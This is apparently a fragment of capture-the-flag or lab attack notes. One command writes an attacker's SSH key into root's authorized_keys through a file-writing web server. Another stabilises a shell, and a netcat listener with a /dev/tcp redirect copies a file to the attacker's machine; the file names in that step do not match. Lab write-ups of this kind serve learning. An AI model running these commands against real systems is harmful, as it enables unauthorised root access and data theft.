# PUT request that will write the file. Having set the document root to /, we specify the full path /root/.ssh/authorized_keys and use the -d flag to set the contents of the written file to our public key.
curl -X PUT localhost:1337/root/.ssh/authorized_keys -d "$(cat root.pub)"

# Stable Shell
script /dev/null -c bash

# Download file from target host to Kali.
nc -lvnp 9001 > RT30000.zip
cat RT3000.zip > /dev/tcp/10.10.kali.ip/9001
